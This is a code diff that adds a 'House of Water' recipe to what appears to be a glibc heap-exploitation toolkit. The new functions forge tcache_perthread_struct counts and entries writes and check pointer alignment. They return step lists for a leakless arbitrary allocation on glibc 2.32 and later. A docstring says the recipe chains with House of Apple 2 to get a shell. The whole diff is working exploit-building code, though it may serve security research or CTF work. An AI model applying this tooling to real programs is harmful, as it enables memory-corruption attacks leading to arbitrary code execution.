@@ -161,6 +161,98 @@ def groom_reclaim(req: int) -> dict:
             "result": "CONTROLLED is allocated at VICTIM's address (same size-class, LIFO)."}
 
 
+# --- House of Water: a LEAKLESS arbitrary allocation on modern glibc (>= 2.32) -------------------
+# tcache_perthread_struct layout (glibc 2.32+): uint16_t counts[64]; tcache_entry *entries[64];
+_TC_BINS = 64
+_TC_COUNTS_OFF = 0
+_TC_ENTRIES_OFF = _TC_BINS * 2                            # 0x80
+
+
+#: MALLOC_ALIGNMENT on 64-bit glibc (2*SIZE_SZ = 16; also 16 on i386 since 2.26). glibc >= 2.32's
+#: tcache_get() rejects an entry that is not aligned to it ("malloc(): unaligned tcache chunk
+#: detected" -> abort), so a forged bin head must be a 16-byte-aligned user pointer.
+MALLOC_ALIGNMENT = 0x10
+
+
+def tcache_target_misalignment(target: int):
+    """None if `target` passes glibc>=2.32's tcache_get aligned_OK check, else the reason it fails."""
+    if target % MALLOC_ALIGNMENT:
+        return (f"target {hex(target)} is not {MALLOC_ALIGNMENT}-byte aligned: glibc>=2.32 "
+                f"tcache_get() aborts with 'malloc(): unaligned tcache chunk detected' -- choose an "
+                f"aligned address at or below it ({hex(target & ~(MALLOC_ALIGNMENT - 1))}) and "
+                f"offset the payload write")
+    return None
+
+
+def forge_tcache_perthread(idx: int, target: int, *, count: int = 1) -> dict:
+    """Forge the two fields of tcache_perthread_struct that hand out an arbitrary chunk WITHOUT a
+    leak: counts[idx] (so malloc believes the bin is non-empty) and entries[idx] := target. The
+    entries[] HEAD pointers are stored UNMANGLED (safe-linking, glibc>=2.32, only mangles the per-
+    chunk `fd`), so no heap-address leak is needed to point the bin head at `target` -- this is the
+    leakless core of House of Water. `target` is the user pointer malloc will return and must be
+    MALLOC_ALIGNMENT-aligned (tcache_get's check); a misaligned one raises ValueError rather than
+    forging a write that would abort. Returns byte writes {offset: bytes} into the struct."""
+    if not 0 <= idx < _TC_BINS:
+        raise ValueError(f"tcache index {idx} out of range 0..{_TC_BINS - 1}")
+    why = tcache_target_misalignment(target)
+    if why:
+        raise ValueError(why)
+    return {
+        _TC_COUNTS_OFF + idx * 2: _struct_u16(count),
+        _TC_ENTRIES_OFF + idx * 8: _struct_u64(target),
+    }
+
+
+def house_of_water_recipe(req: int, *, target_name: str = "TARGET", target: int | None = None) -> dict:
+    """Leakless arbitrary allocation (House of Water, glibc>=2.32). Precondition: a write into the
+    tcache_perthread_struct (House of Water grooms an overlapping/adjacent chunk to get it; here we
+    treat that write as the primitive, like tcache_poison_recipe treats the UAF). Corrupt
+    counts[idx] and entries[idx] := target -- both UNMANGLED -- then malloc(size) returns target.
+    No heap leak, no fd mangling, no double-free key dance. Pairs with House of Apple 2 for a fully
+    leakless FSOP -> shell on >= 2.34.
+
+    The target must be MALLOC_ALIGNMENT (16-byte) aligned -- tcache_get's aligned_OK check. With a
+    concrete `target` a misaligned address is declined ({"ok": False, "reason"}) and an aligned one
+    gets its struct writes precomputed (`writes`: {hex offset: hex bytes}). The returned dict is plain
+    JSON (no callables) so it can be stored as finding evidence."""
+    cs = request2size(req)
+    if not in_tcache_range(cs):
+        return {"ok": False, "reason": f"size {req} (chunk {hex(cs)}) is outside tcache range"}
+    if target is not None:
+        why = tcache_target_misalignment(target)
+        if why:
+            return {"ok": False, "reason": why, "chunk_size": cs, "tcache_index": tcache_index(cs)}
+    idx = tcache_index(cs)
+    out = {
+        "ok": True, "chunk_size": cs, "tcache_index": idx,
+        "leakless": True,
+        "ops": [
+            ("write_tcache_struct", f"counts[{idx}]", "1"),
+            ("write_tcache_struct", f"entries[{idx}]", f"addr({target_name})"),
+            ("alloc", "OUT", req),                         # returns TARGET
+        ],
+        "forge": "forge_tcache_perthread",                 # heap.forge_tcache_perthread(idx, target)
+        "target_alignment": MALLOC_ALIGNMENT,
+        "notes": ("tcache_perthread_struct entries[] heads are NOT safe-linked (only the per-chunk "
+                  "fd is), so the bin head can be pointed at an arbitrary address with no heap leak "
+                  "-- glibc >= 2.32. Requires a write into the per-thread struct (groomed). "
+                  f"{target_name} must be {MALLOC_ALIGNMENT}-byte aligned (tcache_get aligned_OK)."),
+        "result": f"malloc({req}) returns {target_name} (arbitrary allocation, leakless).",
+    }
+    if target is not None:
+        out["target"] = hex(target)
+        out["writes"] = {hex(off): b.hex() for off, b in forge_tcache_perthread(idx, target).items()}
+    return out
+
+
+def _struct_u16(v):
+    return _struct.pack("<H", v & 0xFFFF)
+
+
+def _struct_u64(v):
+    return _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)
+
+
 # --- House of Apple 2: arbitrary write + libc leak -> shell on modern glibc (>= 2.34) -----------
 import struct as _struct  # noqa: E402
 
